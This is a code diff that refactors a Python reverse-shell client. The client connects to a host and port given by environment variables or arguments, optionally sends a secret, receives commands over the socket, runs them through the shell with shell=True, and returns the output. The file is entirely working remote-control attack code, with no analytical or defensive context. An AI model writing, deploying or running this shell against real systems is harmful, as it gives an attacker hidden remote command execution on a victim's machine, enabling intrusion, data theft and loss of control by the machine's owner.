@@ -1,40 +1,77 @@
-import socket,subprocess
+import socket,subprocess,shlex
 import os
-from base64 import b64decode
+import sys
 
-running = True
-cwd = subprocess.check_output("pwd", shell=True).decode().strip()
+def execute_command(cmd):
+    if not cmd:
+        return "No command provided."
 
-port = os.environ.get("PORT", 4444)
-host = os.environ.get("HOST", "127.0.0.1")
-secret = os.environ.get("SECRET")
-
-with socket.socket(socket.AF_INET,socket.SOCK_STREAM) as s:
-    s.connect((host, port))
     try:
-        if secret:
-            s.send(secret.encode())
+        cwd = subprocess.check_output("pwd", shell=True).decode().strip()
+        result = subprocess.run(
+            cmd,
+            shell=True, 
+            cwd=cwd,
+            stdout=subprocess.PIPE,
+            stderr=subprocess.PIPE,
+            text=True,
+            check=True
+        )
 
-        while running:
-            data = s.recv(1024)
-            if not data:
-                break
-            cmd = data.decode().strip()
-            if cmd.startswith("cd "):
-                try:
-                    path = cmd.split(" ", 1)[1]
-                    os.chdir(path)
-                    cwd = subprocess.check_output("pwd", shell=True).decode().strip()
-                    s.send(cwd.encode())
-                except Exception as e:
-                    s.send(str(e).encode())
-                continue
+        if result.stdout:
+            return result.stdout
+        else:
+            return (
+                result.stderr or 
+                "Command executed successfully, but no output."
+            )
 
-            result = subprocess.run(data.decode(), shell=True, cwd=cwd, capture_output=True, text=True)
-            if result.stdout:
-                s.send(result.stdout.encode())
-            if result.stderr:
-                s.send(result.stderr.encode())
-    except:
-        pass
+    except subprocess.CalledProcessError as e:
+        return (
+            f"Command failed with return code {e.returncode}\n"
+            f"{e.stderr.decode()}"
+        )
+
+if __name__ == "__main__":
+    port = os.environ.get("PORT", 4444)
+    host = os.environ.get("HOST", "127.0.0.1")
+    secret = os.environ.get("SECRET")
+
+    if len(sys.argv) > 2:
+        host = sys.argv[1]
+        port = int(sys.argv[2])
+
+
+    running = True
+
+    with socket.socket(socket.AF_INET,socket.SOCK_STREAM) as s:
+        try:
+            s.connect((host, port))
+            if secret:
+                s.send(secret.encode())
+
+            while running:
+                data = s.recv(1024)
+                if not data:
+                    break
+                cmd = data.decode().strip()
+                match cmd:
+                    case _ if cmd.startswith("cd"):
+                        try:
+                            path = cmd.split(" ", 1)[1]
+                            os.chdir(path)
+                            cwd = (
+                                subprocess.check_output("pwd", shell=True)
+                                .decode().strip()
+                            )
+                            s.sendall(cwd.encode())
+                        except Exception as e:
+                            s.sendall(str(e).encode())
+                            continue
+                    case _:
+                       res = execute_command(cmd)
+                       s.sendall(res.encode())
+        except Exception as e:
+            print(f"[-] Connection failed. {str(e)}")
+            
 
